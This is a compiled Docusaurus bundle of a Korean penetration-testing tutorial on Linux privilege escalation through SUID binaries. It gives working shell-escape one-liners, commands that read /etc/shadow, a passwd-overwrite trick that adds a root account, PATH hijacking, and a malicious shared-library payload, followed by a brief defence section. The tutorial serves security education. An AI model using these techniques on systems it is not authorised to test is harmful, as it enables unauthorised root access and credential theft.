"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5344],{28453:(n,e,i)=>{i.d(e,{R:()=>d,x:()=>a});var s=i(96540);const l={},r=s.createContext(l);function d(n){const e=s.useContext(r);return s.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(l):n.components||l:d(n.components),s.createElement(r.Provider,{value:e},n.children)}},29306:(n,e,i)=>{i.r(e),i.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>t,frontMatter:()=>d,metadata:()=>s,toc:()=>h});const s=JSON.parse('{"id":"penetration/post-exploitation/linux-privesc-suid","title":"Linux Privilege Escalation - SUID","description":"\uac1c\uc694","source":"@site/docs/penetration/post-exploitation/linux-privesc-suid.md","sourceDirName":"penetration/post-exploitation","slug":"/penetration/post-exploitation/linux-privesc-suid","permalink":"/my-docusaurus-page/penetration/post-exploitation/linux-privesc-suid","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2,"title":"Linux Privilege Escalation - SUID"},"sidebar":"tutorialSidebar","previous":{"title":"Linux Information Gathering","permalink":"/my-docusaurus-page/penetration/post-exploitation/linux-info-gathering"},"next":{"title":"Linux Privilege Escalation - Sudo","permalink":"/my-docusaurus-page/penetration/post-exploitation/linux-privesc-sudo"}}');var l=i(74848),r=i(28453);const d={sidebar_position:2,title:"Linux Privilege Escalation - SUID"},a="SUID \uad8c\ud55c \uc0c1\uc2b9",c={},h=[{value:"\uac1c\uc694",id:"\uac1c\uc694",level:2},{value:"SUID \ud30c\uc77c \ucc3e\uae30",id:"suid-\ud30c\uc77c-\ucc3e\uae30",level:2},{value:"\uae30\ubcf8 \uac80\uc0c9",id:"\uae30\ubcf8-\uac80\uc0c9",level:3},{value:"\uad8c\ud55c \ud45c\uc2dc \uc774\ud574",id:"\uad8c\ud55c-\ud45c\uc2dc-\uc774\ud574",level:3},{value:"GTFOBins \ud65c\uc6a9",id:"gtfobins-\ud65c\uc6a9",level:2},{value:"\uc8fc\uc694 SUID \ubc14\uc774\ub108\ub9ac",id:"\uc8fc\uc694-suid-\ubc14\uc774\ub108\ub9ac",level:2},{value:"find",id:"find",level:3},{value:"vim/vi",id:"vimvi",level:3},{value:"python/python3",id:"pythonpython3",level:3},{value:"perl",id:"perl",level:3},{value:"php",id:"php",level:3},{value:"awk",id:"awk",level:3},{value:"less/more",id:"lessmore",level:3},{value:"nano",id:"nano",level:3},{value:"nmap (\uad6c\ubc84\uc804)",id:"nmap-\uad6c\ubc84\uc804",level:3},{value:"cp",id:"cp",level:3},{value:"base64",id:"base64",level:3},{value:"zip",id:"zip",level:3},{value:"tar",id:"tar",level:3},{value:"Bash -p \uc635\uc158 (\ub9e4\uc6b0 \uc911\uc694!)",id:"bash--p-\uc635\uc158-\ub9e4\uc6b0-\uc911\uc694",level:2},{value:"-p \ud50c\ub798\uadf8\uc758 \uc911\uc694\uc131",id:"-p-\ud50c\ub798\uadf8\uc758-\uc911\uc694\uc131",level:3},{value:"\uad8c\ud55c \ud655\uc778",id:"\uad8c\ud55c-\ud655\uc778",level:3},{value:"\uc2e4\uc2b5 \uc608\uc2dc",id:"\uc2e4\uc2b5-\uc608\uc2dc",level:2},{value:"\uc608\uc2dc 1: find\ub97c \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9",id:"\uc608\uc2dc-1-find\ub97c-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uc608\uc2dc 2: python\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9",id:"\uc608\uc2dc-2-python\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uc608\uc2dc 3: vim\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9",id:"\uc608\uc2dc-3-vim\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uace0\uae09 \uae30\ubc95",id:"\uace0\uae09-\uae30\ubc95",level:2},{value:"\ucee4\uc2a4\ud140 SUID \ubc14\uc774\ub108\ub9ac \ubd84\uc11d",id:"\ucee4\uc2a4\ud140-suid-\ubc14\uc774\ub108\ub9ac-\ubd84\uc11d",level:3},{value:"PATH Hijacking",id:"path-hijacking",level:3},{value:"\uacf5\uc720 \ub77c\uc774\ube0c\ub7ec\ub9ac Hijacking",id:"\uacf5\uc720-\ub77c\uc774\ube0c\ub7ec\ub9ac-hijacking",level:3},{value:"\ubc29\uc5b4 \ubc29\ubc95",id:"\ubc29\uc5b4-\ubc29\ubc95",level:2},{value:"SUID \ube44\ud2b8 \uc81c\uac70",id:"suid-\ube44\ud2b8-\uc81c\uac70",level:3},{value:"SUID \ubaa8\ub2c8\ud130\ub9c1",id:"suid-\ubaa8\ub2c8\ud130\ub9c1",level:3},{value:"\ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59",id:"\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",level:3},{value:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d",id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",level:2},{value:"\uc2e4\ubb34 \ud301",id:"\uc2e4\ubb34-\ud301",level:2},{value:"\ub2e4\uc74c \ub2e8\uacc4",id:"\ub2e4\uc74c-\ub2e8\uacc4",level:2}];function o(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...n.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(e.header,{children:(0,l.jsx)(e.h1,{id:"suid-\uad8c\ud55c-\uc0c1\uc2b9",children:"SUID \uad8c\ud55c \uc0c1\uc2b9"})}),"\n",(0,l.jsx)(e.h2,{id:"\uac1c\uc694",children:"\uac1c\uc694"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"SUID (Set User ID)"}),": \ud30c\uc77c \uc2e4\ud589 \uc2dc \ud30c\uc77c \uc18c\uc720\uc790\uc758 \uad8c\ud55c\uc73c\ub85c \uc2e4\ud589\ub418\ub294 \ud2b9\uc218 \uad8c\ud55c"]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\ud575\uc2ec \uac1c\ub150"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsx)(e.li,{children:"SUID \ube44\ud2b8\uac00 \uc124\uc815\ub41c \ubc14\uc774\ub108\ub9ac\ub294 \uc18c\uc720\uc790 \uad8c\ud55c\uc73c\ub85c \uc2e4\ud589"}),"\n",(0,l.jsx)(e.li,{children:"root \uc18c\uc720 SUID \ubc14\uc774\ub108\ub9ac = root \uad8c\ud55c\uc73c\ub85c \uc2e4\ud589"}),"\n",(0,l.jsx)(e.li,{children:"\ucde8\uc57d\ud55c SUID \ubc14\uc774\ub108\ub9ac = \uad8c\ud55c \uc0c1\uc2b9 \uac00\ub2a5"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"suid-\ud30c\uc77c-\ucc3e\uae30",children:"SUID \ud30c\uc77c \ucc3e\uae30"}),"\n",(0,l.jsx)(e.h3,{id:"\uae30\ubcf8-\uac80\uc0c9",children:"\uae30\ubcf8 \uac80\uc0c9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# SUID \ud30c\uc77c \ucc3e\uae30\nfind / -type f -perm -4000 2>/dev/null\n\n# SGID \ud30c\uc77c\ub3c4 \ud568\uaed8 \ucc3e\uae30\nfind / -type f -perm -6000 2>/dev/null\n\n# \ud2b9\uc815 \ub514\ub809\ud1a0\ub9ac\uc5d0\uc11c\ub9cc \ucc3e\uae30\nfind /usr/bin -perm -4000 2>/dev/null\nfind /usr/local -perm -4000 2>/dev/null\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\uad8c\ud55c-\ud45c\uc2dc-\uc774\ud574",children:"\uad8c\ud55c \ud45c\uc2dc \uc774\ud574"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"ls -la /usr/bin/passwd\n# -rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd\n#    ^\n#    s = SUID \ube44\ud2b8 \uc124\uc815\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uad8c\ud55c \ud45c\uae30"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"rws"}),": SUID + \uc2e4\ud589 \uad8c\ud55c"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"rwS"}),": SUID\ub9cc (\uc2e4\ud589 \uad8c\ud55c \uc5c6\uc74c)"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.code,{children:"rwx"}),": \uc77c\ubc18 \uc2e4\ud589 \uad8c\ud55c"]}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"gtfobins-\ud65c\uc6a9",children:"GTFOBins \ud65c\uc6a9"}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"GTFOBins"}),": SUID/Sudo \ubc14\uc774\ub108\ub9ac\ub97c \uc545\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9 \ubc29\ubc95 \ubaa8\uc74c"]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc6f9\uc0ac\uc774\ud2b8"}),": ",(0,l.jsx)(e.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})]}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"\uc0ac\uc6a9 \ubc29\ubc95"}),":"]}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:"SUID \ubc14\uc774\ub108\ub9ac \ubc1c\uacac"}),"\n",(0,l.jsx)(e.li,{children:"GTFOBins\uc5d0\uc11c \uac80\uc0c9"}),"\n",(0,l.jsx)(e.li,{children:"SUID \ud0ed \ud655\uc778"}),"\n",(0,l.jsx)(e.li,{children:"\uba85\ub839\uc5b4 \uc2e4\ud589"}),"\n"]}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc8fc\uc694-suid-\ubc14\uc774\ub108\ub9ac",children:"\uc8fc\uc694 SUID \ubc14\uc774\ub108\ub9ac"}),"\n",(0,l.jsx)(e.h3,{id:"find",children:"find"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uc258 \uc2e4\ud589\nfind . -exec /bin/bash -p \\; -quit\n\n# \ub610\ub294\nfind . -exec /bin/sh -p \\; -quit\n\n# \ud30c\uc77c \uc77d\uae30\nfind /etc/shadow -exec cat {} \\;\n"})}),"\n",(0,l.jsx)(e.h3,{id:"vimvi",children:"vim/vi"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# vim\uc73c\ub85c \uc258 \uc2e4\ud589\nvim -c ':!/bin/sh'\n\n# \ub610\ub294 vim \ub0b4\uc5d0\uc11c\nvim\n:set shell=/bin/sh\n:shell\n\n# vi\nvi -c ':!/bin/sh'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"pythonpython3",children:"python/python3"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# Python \uc258\npython -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n\n# Python3\npython3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n'})}),"\n",(0,l.jsx)(e.h3,{id:"perl",children:"perl"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"perl -e 'exec \"/bin/sh\";'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"php",children:"php"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"})}),"\n",(0,l.jsx)(e.h3,{id:"awk",children:"awk"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"awk 'BEGIN {system(\"/bin/sh -p\")}'\n"})}),"\n",(0,l.jsx)(e.h3,{id:"lessmore",children:"less/more"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# less \uc2e4\ud589 \ud6c4\nless /etc/passwd\n\n# less \ub0b4\uc5d0\uc11c \uc785\ub825:\n!/bin/sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"nano",children:"nano"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# nano \uc2e4\ud589\nnano\n\n# Ctrl+R Ctrl+X \uc785\ub825 \ud6c4:\nreset; sh 1>&0 2>&0\n"})}),"\n",(0,l.jsx)(e.h3,{id:"nmap-\uad6c\ubc84\uc804",children:"nmap (\uad6c\ubc84\uc804)"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# Nmap < 5.21\nnmap --interactive\nnmap> !sh\n"})}),"\n",(0,l.jsx)(e.h3,{id:"cp",children:"cp"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# /etc/passwd \ub36e\uc5b4\uc4f0\uae30\ub85c root \uacc4\uc815 \ucd94\uac00\ncp /etc/passwd /tmp/passwd.bak\nopenssl passwd newpass\n# \uc0c8 root \uacc4\uc815 \ub77c\uc778 \ucd94\uac00:\n# hacker:HASH:0:0:root:/root:/bin/bash\ncp modified_passwd /etc/passwd\nsu hacker\n"})}),"\n",(0,l.jsx)(e.h3,{id:"base64",children:"base64"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# /etc/shadow \uc77d\uae30\nLFILE=/etc/shadow\nbase64 "$LFILE" | base64 --decode\n'})}),"\n",(0,l.jsx)(e.h3,{id:"zip",children:"zip"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ud30c\uc77c \uc77d\uae30\nTF=$(mktemp -u)\nLFILE=/etc/shadow\nzip $TF $LFILE\nunzip -p $TF\n"})}),"\n",(0,l.jsx)(e.h3,{id:"tar",children:"tar"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uc258 \uc2e4\ud589\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"bash--p-\uc635\uc158-\ub9e4\uc6b0-\uc911\uc694",children:"Bash -p \uc635\uc158 (\ub9e4\uc6b0 \uc911\uc694!)"}),"\n",(0,l.jsx)(e.h3,{id:"-p-\ud50c\ub798\uadf8\uc758-\uc911\uc694\uc131",children:"-p \ud50c\ub798\uadf8\uc758 \uc911\uc694\uc131"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \u2705 \uc62c\ubc14\ub978 \ubc29\ubc95 (\uad8c\ud55c \uc0c1\uc2b9\ub428)\n/bin/bash -p\n\n# \u274c \uc798\ubabb\ub41c \ubc29\ubc95 (\uad8c\ud55c \uc0c1\uc2b9 \uc548 \ub428)\n/bin/bash\n"})}),"\n",(0,l.jsxs)(e.p,{children:[(0,l.jsx)(e.strong,{children:"-p \uc635\uc158 \uc124\uba85"}),":"]}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"Privileged mode"}),": SUID \uad8c\ud55c \uc720\uc9c0"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\uc2e4\ud6a8 UID \uc720\uc9c0"}),": effective UID\ub97c \uc2e4\uc81c UID\ub85c \ucd08\uae30\ud654\ud558\uc9c0 \uc54a\uc74c"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\ud544\uc218 \uc0ac\uc6a9"}),": SUID \ubc14\uc774\ub108\ub9ac\uc5d0\uc11c \uc258 \uc2e4\ud589 \uc2dc \ubc18\ub4dc\uc2dc \uc0ac\uc6a9"]}),"\n"]}),"\n",(0,l.jsx)(e.h3,{id:"\uad8c\ud55c-\ud655\uc778",children:"\uad8c\ud55c \ud655\uc778"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# -p \uc5c6\uc774 \uc2e4\ud589\n$ /bin/bash\n$ id\nuid=1000(user) gid=1000(user) groups=1000(user)\n\n# -p \uc0ac\uc6a9\n$ /bin/bash -p\n$ id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n#                              ^^^^^^^^^^^\n#                              Root \uad8c\ud55c!\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc2e4\uc2b5-\uc608\uc2dc",children:"\uc2e4\uc2b5 \uc608\uc2dc"}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-1-find\ub97c-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",children:"\uc608\uc2dc 1: find\ub97c \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# 1. SUID \ubc14\uc774\ub108\ub9ac \ud655\uc778\nfind / -perm -4000 2>/dev/null | grep find\n# \ucd9c\ub825: /usr/bin/find\n\n# 2. \uc18c\uc720\uc790 \ud655\uc778\nls -la /usr/bin/find\n# -rwsr-xr-x 1 root root 320160 Feb 18 2020 /usr/bin/find\n\n# 3. GTFOBins\uc5d0\uc11c find \uac80\uc0c9\n# https://gtfobins.github.io/gtfobins/find/\n\n# 4. \uad8c\ud55c \uc0c1\uc2b9\nfind . -exec /bin/bash -p \\; -quit\n\n# 5. \ud655\uc778\nid\n# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n\nwhoami\n# root\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-2-python\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",children:"\uc608\uc2dc 2: python\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# 1. SUID python \ud655\uc778\nfind / -name python* -perm -4000 2>/dev/null\n# /usr/bin/python3\n\n# 2. \uad8c\ud55c \uc0c1\uc2b9\npython3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n\n# 3. \ud655\uc778\nwhoami\n# root\n'})}),"\n",(0,l.jsx)(e.h3,{id:"\uc608\uc2dc-3-vim\uc744-\uc774\uc6a9\ud55c-\uad8c\ud55c-\uc0c1\uc2b9",children:"\uc608\uc2dc 3: vim\uc744 \uc774\uc6a9\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# 1. SUID vim \ud655\uc778\nfind / -name vim -perm -4000 2>/dev/null\n# /usr/bin/vim\n\n# 2. \uad8c\ud55c \uc0c1\uc2b9\nvim -c ':!/bin/sh'\n\n# 3. \ud655\uc778\nid\n# uid=1000(user) gid=1000(user) euid=0(root)\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uace0\uae09-\uae30\ubc95",children:"\uace0\uae09 \uae30\ubc95"}),"\n",(0,l.jsx)(e.h3,{id:"\ucee4\uc2a4\ud140-suid-\ubc14\uc774\ub108\ub9ac-\ubd84\uc11d",children:"\ucee4\uc2a4\ud140 SUID \ubc14\uc774\ub108\ub9ac \ubd84\uc11d"}),"\n",(0,l.jsx)(e.p,{children:"\uc77c\ubc18\uc801\uc774\uc9c0 \uc54a\uc740 SUID \ubc14\uc774\ub108\ub9ac \ubc1c\uacac \uc2dc:"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# 1. \ud30c\uc77c \ud0c0\uc785 \ud655\uc778\nfile /usr/local/bin/custom_binary\n\n# 2. \ubb38\uc790\uc5f4 \ud655\uc778\nstrings /usr/local/bin/custom_binary\n\n# 3. \ub77c\uc774\ube0c\ub7ec\ub9ac \uc758\uc874\uc131\nldd /usr/local/bin/custom_binary\n\n# 4. \uc2e4\ud589 \ubd84\uc11d (\ucd94\uc801)\nstrace /usr/local/bin/custom_binary 2>&1 | grep -E "open|read|write|exec"\n\n# 5. \ub3d9\uc801 \ubd84\uc11d\nltrace /usr/local/bin/custom_binary\n'})}),"\n",(0,l.jsx)(e.h3,{id:"path-hijacking",children:"PATH Hijacking"}),"\n",(0,l.jsx)(e.p,{children:"\ucde8\uc57d\ud55c SUID \ubc14\uc774\ub108\ub9ac\uac00 \uc808\ub300 \uacbd\ub85c \uc5c6\uc774 \uba85\ub839 \uc2e4\ud589 \uc2dc:"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ucde8\uc57d\ud55c \ucf54\ub4dc \uc608\uc2dc:\n# system(\"cat /tmp/file\");  // \uc808\ub300 \uacbd\ub85c \uc5c6\uc74c!\n\n# 1. \uc545\uc131 cat \uc0dd\uc131\necho '#!/bin/bash' > /tmp/cat\necho '/bin/bash -p' >> /tmp/cat\nchmod +x /tmp/cat\n\n# 2. PATH \uc870\uc791\nexport PATH=/tmp:$PATH\n\n# 3. SUID \ubc14\uc774\ub108\ub9ac \uc2e4\ud589\n/usr/local/bin/vulnerable_binary\n\n# 4. Root \uc258 \ud68d\ub4dd!\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\uacf5\uc720-\ub77c\uc774\ube0c\ub7ec\ub9ac-hijacking",children:"\uacf5\uc720 \ub77c\uc774\ube0c\ub7ec\ub9ac Hijacking"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# 1. \ucde8\uc57d\ud55c SUID \ubc14\uc774\ub108\ub9ac \ucc3e\uae30\nfind / -perm -4000 2>/dev/null\n\n# 2. \ub77c\uc774\ube0c\ub7ec\ub9ac \uc758\uc874\uc131 \ud655\uc778\nldd /usr/local/bin/suid_binary\n\n# 3. \uc4f0\uae30 \uac00\ub2a5\ud55c \ub77c\uc774\ube0c\ub7ec\ub9ac \uacbd\ub85c \ud655\uc778\nstrace /usr/local/bin/suid_binary 2>&1 | grep -i "no such file"\n# \ucd9c\ub825 \uc608\uc2dc:\n# open("/home/user/.config/lib.so.1", O_RDONLY) = -1 ENOENT\n\n# 4. \uc545\uc131 \ub77c\uc774\ube0c\ub7ec\ub9ac \uc0dd\uc131 (C \ucf54\ub4dc)\ncat > inject.c << \'EOF\'\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n}\nEOF\n\n# 5. \ucef4\ud30c\uc77c \ubc0f \ubc30\uce58\ngcc -shared -fPIC -o /home/user/.config/lib.so.1 inject.c\n\n# 6. SUID \ubc14\uc774\ub108\ub9ac \uc2e4\ud589\n/usr/local/bin/suid_binary\n\n# 7. Root \uc258 \ud68d\ub4dd!\n'})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\ubc29\uc5b4-\ubc29\ubc95",children:"\ubc29\uc5b4 \ubc29\ubc95"}),"\n",(0,l.jsx)(e.h3,{id:"suid-\ube44\ud2b8-\uc81c\uac70",children:"SUID \ube44\ud2b8 \uc81c\uac70"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ubd88\ud544\uc694\ud55c SUID \uc81c\uac70\nchmod u-s /path/to/binary\n\n# \uc608\uc2dc\nchmod u-s /usr/bin/vim\n"})}),"\n",(0,l.jsx)(e.h3,{id:"suid-\ubaa8\ub2c8\ud130\ub9c1",children:"SUID \ubaa8\ub2c8\ud130\ub9c1"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \uae30\uc900\uc120 \uc0dd\uc131\nfind / -perm -4000 2>/dev/null > /root/suid_baseline.txt\n\n# \uc8fc\uae30\uc801\uc73c\ub85c \ube44\uad50\nfind / -perm -4000 2>/dev/null > /tmp/suid_current.txt\ndiff /root/suid_baseline.txt /tmp/suid_current.txt\n"})}),"\n",(0,l.jsx)(e.h3,{id:"\ucd5c\uc18c-\uad8c\ud55c-\uc6d0\uce59",children:"\ucd5c\uc18c \uad8c\ud55c \uc6d0\uce59"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:"# \ud544\uc694\ud55c \uacbd\uc6b0\uc5d0\ub9cc SUID \uc0ac\uc6a9\n# \ub300\uc548: sudo \uc124\uc815\n"})}),"\n",(0,l.jsx)(e.hr,{}),"\n",(0,l.jsx)(e.h2,{id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",children:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-bash",children:'# SUID \ud30c\uc77c \ucc3e\uae30\nfind / -perm -4000 2>/dev/null\n\n# GTFOBins \ud655\uc778\n# https://gtfobins.github.io/\n\n# \uad8c\ud55c \uc0c1\uc2b9 (\uc77c\ubc18\uc801\uc778 \ubc29\ubc95)\n\n# find\nfind . -exec /bin/bash -p \\; -quit\n\n# vim\nvim -c \':!/bin/sh\'\n\n# python\npython -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n\n# perl\nperl -e \'exec "/bin/sh";\'\n\n# awk\nawk \'BEGIN {system("/bin/sh -p")}\'\n\n# less\nless /etc/passwd\n!/bin/sh\n\n# \uad8c\ud55c \ud655\uc778\nid\nwhoami\n'})}),"\n",(0,l.jsx)(e.h2,{id:"\uc2e4\ubb34-\ud301",children:"\uc2e4\ubb34 \ud301"}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"GTFOBins \uc6b0\uc120 \ud655\uc778"})," - \uac00\uc7a5 \ube60\ub978 \ubc29\ubc95"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"-p \ud50c\ub798\uadf8 \ud544\uc218"})," - Bash \uc258 \uc2e4\ud589 \uc2dc"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"\ucee4\uc2a4\ud140 \ubc14\uc774\ub108\ub9ac \ubd84\uc11d"})," - strings, strace \ud65c\uc6a9"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"PATH Hijacking \uc2dc\ub3c4"})," - \uc808\ub300 \uacbd\ub85c \uc5c6\ub294 \uba85\ub839\uc5b4"]}),"\n",(0,l.jsxs)(e.li,{children:["\u2705 ",(0,l.jsx)(e.strong,{children:"\ub77c\uc774\ube0c\ub7ec\ub9ac Hijacking"})," - \uc4f0\uae30 \uac00\ub2a5\ud55c \uacbd\ub85c \ud655\uc778"]}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\ub2e4\uc74c-\ub2e8\uacc4",children:"\ub2e4\uc74c \ub2e8\uacc4"}),"\n",(0,l.jsxs)(e.ul,{children:["\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"Sudo \uad8c\ud55c \ud655\uc778"})," \u2192 ",(0,l.jsx)(e.a,{href:"/penetration/post-exploitation/linux-privesc-sudo",children:"Linux Privilege Escalation - Sudo"})]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\uc815\ubcf4 \uc218\uc9d1"})," \u2192 ",(0,l.jsx)(e.a,{href:"/penetration/post-exploitation/linux-info-gathering",children:"Linux Information Gathering"})]}),"\n"]})]})}function t(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(o,{...n})}):o(n)}}}]);